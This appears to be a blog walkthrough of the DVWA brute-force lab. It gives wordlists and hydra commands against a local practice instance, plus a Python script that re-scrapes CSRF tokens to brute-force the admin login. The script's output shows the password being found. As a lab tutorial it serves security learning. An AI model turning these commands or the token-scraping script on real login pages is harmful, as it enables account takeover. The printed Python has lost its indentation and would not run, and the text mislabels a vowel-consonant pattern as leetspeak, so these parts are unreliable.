---
title: DVWA - Brute Force
date: 2023-12-06
categories: [DVWA, Brute Force]
tags: [dvwa, brute-force, hydra, burp-suite, python, bs4, beautifulsoup, csrf, 2to3]
img_path: /assets/dvwa/brute_force
published: true
---

## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

> The DVWA server itself contains instructions about almost everything.

_**Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment._

_The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface._

![](dvwa_home.png){: width='70%' }

The DVWA server has **4 different security levels** which can be set as seen below:

![](security_levels.png){: width='70%' }

- **Low**: This security level is completely vulnerable and has no security measures at all. It's use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.
- **Medium**: This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.
- **High**: This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.
- **Impossible**: This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.

**Password cracking** is the process of recovering passwords from data that has been stored in or transmitted by a computer system. A common approach is to repeatedly try guesses for the password.

Users often choose **weak passwords**. Examples of insecure choices include single words found in dictionaries, family names, any too short password (usually thought to be less than 6 or 7 characters), or predictable patterns (e.g. alternating vowels and consonants, which is known as leetspeak, so "password" becomes "p@55w0rd").

Creating a **targeted wordlist**, which is generated towards the target, often gives the highest success rate. There are public tools out there that will create a dictionary based on a combination of company websites, personal social networks and other common information (such as birthdays or year of graduation).

A last resort is to try every possible password, known as a **brute force attack**. In theory, if there is no limit to the number of attempts, a brute force attack will always be successful since the rules for acceptable passwords must be publicly known; but as the length of the password increases, so does the number of possible passwords making the attack time longer.

## Security: Low

> _The developer has completely missed out any protections methods, allowing for anyone to try as many times as they wish, to login to any user without any repercussions._

1. Intercept packet with Burp Suite:

	![](low_burp_proxy.png)

	Things to note down:
	- `GET` request
	- Parameters: `username`, `password`, `Login`
	- `Cookie: PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=low`

2. Check for error messages when attempting a random login (via Burp Suite or browser):

	![](error_message.jpg)

	![](error_message.png)


3. Create a small username and password lists for efficiency:

	```shell
	cat usernames.txt
	root
	peter
	kevin
	harris
	maria
	andrew
	mike
	sridevi
	pavithra
	admin

	cat passwords.txt
	1234
	123456
	pass
	password123
	qwerty
	qwerty123456
	12345
	1234567890
	qwertyasdfg
	password
	```

3. Build a `hydra` command using the above info:

	```shell
	hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=low:F=Username and/or password incorrect." -t 30
	```

	![](low_hydra.png)

	![](low_success.png)

## Security: Medium

> _This stage adds a sleep on the failed login screen. This mean when you login incorrectly, there will be an extra two second wait before the page is visible. This will only slow down the amount of requests which can be processed a minute, making it longer to brute force._

Almost identical `hydra` command as before, just change `security=low` to `security=medium`:

```shell
hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=medium:F=Username and/or password incorrect." -t 30
```

![](medium_hydra.png)

## Security: High

> _There has been an "anti Cross-Site Request Forgery (CSRF) token" used. There is a old myth that this protection will stop brute force attacks. This is not the case. This level also extends on the medium level, by waiting when there is a failed login but this time it is a random amount of time between two and four seconds. The idea of this is to try and confuse any timing predictions. Using a CAPTCHA form could have a similar effect as a CSRF token._

Same concept as before, this time changing `security=medium` to `security=high`:

```shell
hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=high:F=Username and/or password incorrect." -t 30
```

![](high_hydra.png)

## Security: Impossible

> _Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a "lock out" feature, where if there are five bad logins within the last 15 minutes, the locked out user cannot log in. If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know if there is a valid account on the system, with that password, and if the account is locked. This can cause a "Denial of Service" (DoS), by having someone continually trying to login to someone's account. This level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent)._

Resources to read:
- OWASP: [Cross Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)

> The CSRF token is used to add credibility to the origin of the request being received by the server, this token is a impossible to guess random number generated by the server and is sent along with our GET request.

1. Using the `hydra` command won't work this time (`100 valid passwords found` --> all combinations):

	```shell
	hydra -L usernames.txt -P passwords.txt 127.0.0.1 -s 42001 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=ud36qu65oddvmncfg54n515nhn; security=impossible:F=Username and/or password incorrect." -t
	30
	```

	![](impossible_hydra.png)

2. Due to the added CSRF token, `hydra` can't brute force the credentials. It does not have the ability to collect the CSRF token while making the request:

	![](csrf_token.png)

	![](hidden_to_text.jpg)

	![](token_appearance.png)

	The CSRF token (`user_token`) changes on every attempted login:

	![](impossible_burp_proxy_user_token.png)

	![](impossible_burp_proxy_user_token1.png)

3. Create a custom brute-forcing script:

	> 

	Changes needed from the [Security Tutorials article](https://securitytutorials.co.uk/brute-forcing-web-logins-with-dvwa/) (original code taken from [Danny Beton](https://medium.com/@dannybeton/dvwa-brute-force-tutorial-high-security-456e6ed3ae39)):
	1. `sudo pip3 install bs4, 2to3`
	2. `sudo apt install 2to3`
	3. Conversion of the script from Python2 to Python3: `2to3 -w csrf_script.py` 
	4. Modify bs4 import: `from BeautifulSoup import BeautifulSoup as Soup` to `from bs4 import BeautifulSoup as Soup`.

	> Documentation: [bs4](https://pypi.org/project/beautifulsoup4/), [2to3](https://docs.python.org/3/library/2to3.html).  


	```python
	# modified code
	from sys import argv
	import requests
	from bs4 import BeautifulSoup as Soup

	# give our arguments more semantic friendly names
	script, filename, success_message = argv
	txt = open(filename)

	# set up our target, cookie and session
	url = 'http://127.0.0.1:42001/vulnerabilities/brute/index.php'
	cookie = {'security': 'high', 'PHPSESSID':'ud36qu65oddvmncfg54n515nhn'}
	s = requests.Session()
	target_page = s.get(url, cookies=cookie)

	''' 
	checkSuccess
	@param: html (String)

	Searches the response HTML for our specified success message
	'''
	def checkSuccess(html):
	# get our soup ready for searching
	soup = Soup(html, features="lxml")
	# check for our success message in the soup
	search = soup.findAll(text=success_message)
	
	if not search:
	success = False

	else:
	success = True

	# return the brute force result
	return success

	# Get the intial CSRF token from the target site
	page_source = target_page.text
	soup = Soup(page_source, features="lxml");
	csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')

	# Display before attack
	print('DVWA URL' + url)
	print('CSRF Token='+ csrf_token)

	# Loop through our provided password file
	with open(filename) as f:
	print('Running brute force attack...')
	for password in f:

	# strip whitespace
	password = password.strip()
	
	# setup the payload
	payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
	r = s.get(url, cookies=cookie, params=payload)
	success = checkSuccess(r.text)

	if not success:
	# if it failed the CSRF token will be changed. Get the new one
	soup = Soup(r.text, features="lxml")
	csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
	else:
	# Success! Show the result
	print('Password is: ' + password)
	break

	# We failed, bummer. 
	if not success:
	print('Brute force failed. No matches found.')
	```

	```shell
	# running python script
	python3 csrf_script.py passwords.txt "Welcome to the password protected area admin"
	DVWA URLhttp://127.0.0.1:42001/vulnerabilities/brute/index.php
	CSRF Token=09377057fe6a3b73fe3eb82c6ecce061
	Running brute force attack...
	Password is: password
	```


